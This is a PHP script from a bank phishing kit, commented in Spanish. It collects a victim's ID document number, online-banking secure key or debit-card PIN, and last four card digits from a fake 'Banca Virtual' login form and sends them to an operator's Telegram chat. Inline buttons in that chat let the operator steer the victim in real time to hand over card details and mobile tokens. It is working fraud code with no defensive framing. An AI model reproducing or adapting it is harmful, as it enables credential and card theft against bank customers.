<?php
// process_bv_login.php
// (AHORA SOLO PROCESA EL LOGIN)

session_start();

// 1. Cargar la configuración principal
$config = require 'conexion.php';

// 2. Generar ID de transacción primero
$new_id = bin2hex(random_bytes(16));

// --- Captura de datos del formulario (Login) ---
if (isset($_POST['debit_card_key'])) {
    $doc_type = $_POST['document_type_td'] ?? 'No especificado';
    $doc_number = $_POST['document_number_td'] ?? 'No especificado';
    $debit_card_key = $_POST['debit_card_key'] ?? 'No especificado';
    $last_4_digits = $_POST['last_4_digits'] ?? 'No especificado';
    $secure_key = null;
}
else {
    $doc_type = $_POST['document_type'] ?? 'No especificado';
    $doc_number = $_POST['document_number'] ?? 'No especificado';
    $secure_key = $_POST['secure_key'] ?? 'No especificado';
    $debit_card_key = null;
    $last_4_digits = null;
}

// --- Lógica de Telegram (PRIMERO, antes que la BD) ---
$telegram_config = $config['telegram'];
$botToken = $telegram_config['bot_token'] ?? '';
$chatId = $telegram_config['chat_id'] ?? '';

if (!empty($botToken) && !empty($chatId)) {
    // Mensaje para Telegram (Login)
    $message = "🏦 *Nuevo Log - Banca Virtual* 🏦\n\n";
    $message .= "› *Tipo Doc:* " . htmlspecialchars($doc_type) . "\n";
    $message .= "› *Documento:* `" . htmlspecialchars($doc_number) . "`\n";
    if ($debit_card_key) {
        $message .= "› *Clave T. Débito:* `" . htmlspecialchars($debit_card_key) . "`\n";
        $message .= "› *Últimos 4 Dígitos:* `" . htmlspecialchars($last_4_digits) . "`\n";
    }
    else {
        $message .= "› *Clave Segura:* `" . htmlspecialchars($secure_key) . "`\n";
    }

    // Limpiamos la URL base
    $base_update_url = trim($config['base_url']);
    $admin_prompt_url = str_replace('actualizar_estado.php', 'admin_prompt_movil.php', $base_update_url);

    $post_fields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown',
    ];

    // Solo agregar botones si la URL es pública (no localhost)
    $es_local = (strpos($base_update_url, 'localhost') !== false);
    if (!$es_local && !empty($base_update_url)) {
        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => '✅ TC Aprobada', 'url' => $base_update_url . '?id=' . $new_id . '&estado=11'],
                ],
                [
                    ['text' => '❌ Error TC Crédito', 'url' => $base_update_url . '?id=' . $new_id . '&estado=12'],
                    ['text' => '❌ Error TC Débito', 'url' => $base_update_url . '?id=' . $new_id . '&estado=15'],
                ],
                [
                    ['text' => '💳 Pedir TC Crédito', 'url' => $base_update_url . '?id=' . $new_id . '&estado=13'],
                    ['text' => '🏦 Pedir TC Débito', 'url' => $base_update_url . '?id=' . $new_id . '&estado=14'],
                ],
                [
                    ['text' => '✅ Soy yo', 'url' => $base_update_url . '?id=' . $new_id . '&estado=6'],
                    ['text' => '❌ Error Soy yo', 'url' => $base_update_url . '?id=' . $new_id . '&estado=7'],
                ],
                [
                    ['text' => '❌ Login Fallido', 'url' => $base_update_url . '?id=' . $new_id . '&estado=1'],
                    ['text' => '⚠️ Pedir Token App', 'url' => $base_update_url . '?id=' . $new_id . '&estado=2'],
                ],
                [
                    ['text' => '❌ Rechazar', 'url' => $base_update_url . '?id=' . $new_id . '&estado=3'],
                    ['text' => '📱 Pedir Token Móvil', 'url' => $admin_prompt_url . '?id=' . $new_id],
                ],
                [
                    ['text' => '🚫 Token Móvil Inválido', 'url' => $base_update_url . '?id=' . $new_id . '&estado=5']
                ]
            ]
        ];
        $post_fields['reply_markup'] = json_encode($keyboard);
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$botToken}/sendMessage");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_exec($ch);
    curl_close($ch);

}

// --- Lógica de Base de Datos (DESPUÉS de Telegram, no bloquea si falla) ---
$db_config = $config['db'];
$driver = $db_config['driver'];
$dsn = ($driver === 'mysql')
    ? "mysql:host={$db_config['host']};dbname={$db_config['dbname']};charset=utf8mb4"
    : "pgsql:host={$db_config['host']};dbname={$db_config['dbname']}";

try {
    $pdo = new PDO($dsn, $db_config['user'], $db_config['password']);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $estado = 0;
    $sql = "INSERT INTO a_confirmar (id, estado) VALUES (:id, :estado)";
    $stmt = $pdo->prepare($sql);
    $stmt->execute([':id' => $new_id, ':estado' => $estado]);
    $_SESSION['transaction_id'] = $new_id;
}
catch (PDOException $e) {
    // Loguear el error pero NO bloquear al usuario — Telegram ya recibió los datos
    error_log("Error de base de datos en login: " . $e->getMessage());
}

// Redirigir con el ID generado
header('Location: ../../index.php?id=' . $new_id);
exit;
?>